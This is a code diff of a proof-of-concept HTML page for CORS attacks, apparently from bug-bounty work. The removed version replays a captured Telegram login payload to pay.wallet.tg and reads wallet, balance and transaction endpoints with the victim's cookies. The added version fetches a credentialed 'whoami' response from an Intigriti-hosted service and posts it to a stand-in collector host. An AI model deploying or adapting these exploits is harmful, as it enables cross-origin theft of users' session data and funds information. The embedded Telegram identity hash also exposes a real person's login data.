@@ -1,73 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS Auth Test – Wallet.tg</title>
-</head>
-<body>
-  <h1>Wallet.tg CORS Exploit Test</h1>
-  <p>This PoC tests if cross-origin Telegram auth and session-based requests are allowed.</p>
-  <button onclick="start()">🚀 Start Test</button>
-  <pre id="output"></pre>
-
-  <script>
-    const tgPayload = {
-      id: 7793424216,
-      first_name: "Ruben",
-      last_name: "H1",
-      username: "Username21_rd",
-      auth_date: 1752079801,
-      hash: "0286a9d09b7470311e0260db1d01596fbc9418d3e50e61630ea60adbee9b85f5"
-    };
-
-    async function authorizeByTelegram() {
-      const res = await fetch("https://pay.wallet.tg/api/v1/users/authorize_by_telegram/", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(tgPayload),
+<html>
+  <body>
+    <h1>CORS Exploit Test</h1>
+    <script>
+      fetch("https://intigriti.ilias-solutions.com/intigriti/gimliruntimeservices/whoami", {
         credentials: "include"
-      });
-
-      return res.ok;
-    }
-
-    async function testEndpoints() {
-      const endpoints = [
-        "/api/v1/users/me",
-        "/api/v1/wallet",
-        "/api/v1/balance",
-        "/api/v1/transactions",
-        "/api/v1/profile"
-      ];
-
-      for (const ep of endpoints) {
-        try {
-          const res = await fetch("https://pay.wallet.tg" + ep, {
-            method: "GET",
-            credentials: "include"
-          });
-          const text = await res.text();
-
-          document.getElementById("output").textContent += `\n\n[${ep}] (${res.status}):\n${text.substring(0, 500)}\n---`;
-        } catch (e) {
-          document.getElementById("output").textContent += `\n\n[${ep}] Error: ${e.message}\n---`;
-        }
-      }
-    }
-
-    async function start() {
-      document.getElementById("output").textContent = "Sending Telegram login payload...";
-      const success = await authorizeByTelegram();
-
-      if (success) {
-        document.getElementById("output").textContent += "\n✅ Login request returned 200. Now probing endpoints...";
-        await testEndpoints();
-      } else {
-        document.getElementById("output").textContent += "\n❌ Login request failed.";
-      }
-    }
-  </script>
-</body>
+      })
+      .then(response => response.text())
+      .then(data => {
+        console.log("RESPONSE:", data);
+        // Optionally, send to your own server:
+        fetch("https://your-own-endpoint.com/collect", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ data: data })
+        });
+      })
+      .catch(error => console.error("Error:", error));
+    </script>
+  </body>
 </html>
